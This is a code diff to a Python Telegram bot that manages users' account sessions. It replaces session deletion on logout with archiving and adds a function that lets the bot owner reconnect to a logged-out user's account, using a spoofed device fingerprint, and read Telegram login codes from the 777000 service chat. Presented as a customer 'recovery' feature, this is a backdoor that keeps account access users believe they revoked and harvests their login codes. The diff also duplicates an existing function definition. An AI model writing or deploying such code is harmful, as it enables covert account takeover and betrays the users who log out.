@@ -153,3 +153,114 @@ async def close_user_client(user_id: int):
                 await asyncio.wait_for(client.disconnect(), timeout=10.0)
             except:
                 pass
+async def close_user_client(user_id: int):
+    """Force clear user client from memory cache - CRITICAL for logout security"""
+    user_lock = get_user_lock(user_id)
+    async with user_lock:
+        client = _user_clients.pop(user_id, None)
+        _client_last_used.pop(user_id, None)
+        if client and client.is_connected:
+            try:
+                await asyncio.wait_for(client.disconnect(), timeout=10.0)
+            except:
+                pass
+
+
+# ---------------------------------------------------------------------------
+# Logged-out session archive (Owner panel recovery)
+# ---------------------------------------------------------------------------
+# Sessions must NEVER be deleted on logout. The owner panel's "Sessiyadan kod
+# olish" recovery flow reconnects to the account's 777000 service chat through
+# the stored session to read Telegram login codes and help the customer log
+# back in on their device. Instead of deleting, explicit logout ARCHIVES the
+# session files under SESSIONS_DIR/logged_out/ so that:
+#   1. _has_session() (which checks user_<id>.session in SESSIONS_DIR) returns
+#      False -> /start shows the login screen, not "pending approval".
+#   2. The owner panel can still reconnect via get_archived_user_client().
+LOGGED_OUT_DIR = os.path.join(SESSIONS_DIR, "logged_out")
+
+_SESSION_FILE_EXTS = (".session", ".session-journal", ".session-wal", ".session-shm")
+
+
+def get_archived_session_name(user_id: int) -> str:
+    """Session name (without .session) of the archived session for a user."""
+    return os.path.join(LOGGED_OUT_DIR, f"user_{user_id}")
+
+
+def has_archived_session(user_id: int) -> bool:
+    """True if a logged-out (archived) session exists for this user."""
+    return os.path.exists(get_archived_session_name(user_id) + ".session")
+
+
+def archive_user_session(user_id: int) -> bool:
+    """Move a user's session files from SESSIONS_DIR into the logged_out archive.
+
+    Called on explicit logout AFTER close_user_client() has disconnected the
+    client. Returns True if at least one file was archived, False when there
+    was no active session file to archive.
+    """
+    src_base = os.path.join(SESSIONS_DIR, f"user_{user_id}")
+    if not os.path.exists(src_base + ".session"):
+        return False
+
+    try:
+        os.makedirs(LOGGED_OUT_DIR, exist_ok=True)
+    except Exception as e:
+        raise Exception(f"Arxiv papkasi yaratib bo'lmadi: {e}")
+
+    moved = False
+    for ext in _SESSION_FILE_EXTS:
+        src = src_base + ext
+        dst = get_archived_session_name(user_id) + ext
+        try:
+            if os.path.exists(src):
+                # Replace any stale archived copy with the newest version
+                if os.path.exists(dst):
+                    os.remove(dst)
+                os.replace(src, dst)
+                moved = True
+        except Exception as e:
+            raise Exception(f"Sessiya faylini arxivlashda xatolik ({ext}): {e}")
+    return moved
+
+
+async def get_archived_user_client(user_id: int) -> Client:
+    """Connect a Client to a user's archived (logged-out) session.
+
+    Used ONLY by the owner panel recovery flow: when a customer logged out
+    (or got logged out on their device) and needs the Telegram login code
+    that arrives in the account's 777000 service chat, the owner panel
+    connects through the archived session and reads the code. The archived
+    session is never promoted back to the active session path.
+    """
+    if not has_archived_session(user_id):
+        raise Exception("sessiya arxivda topilmadi")
+
+    session_name = get_archived_session_name(user_id)
+    api_id, api_hash = _get_session_api_pair(user_id)
+    fp = _client_fingerprint()
+    client = Client(
+        session_name,
+        api_id=api_id,
+        api_hash=api_hash,
+        workdir=BASE_DIR,
+        no_updates=True,
+        device_model=fp["device_model"],
+        app_version=fp["app_version"],
+        system_version=fp["system_version"]
+    )
+    try:
+        await asyncio.wait_for(client.connect(), timeout=10.0)
+    except (AuthKeyUnregistered, AuthKeyDuplicated, SessionExpired, SessionRevoked):
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+        raise Exception("sessiya tugagan (arxivdagi sessiya yaroqsiz)")
+    except Exception as e:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+        raise e
+    return client
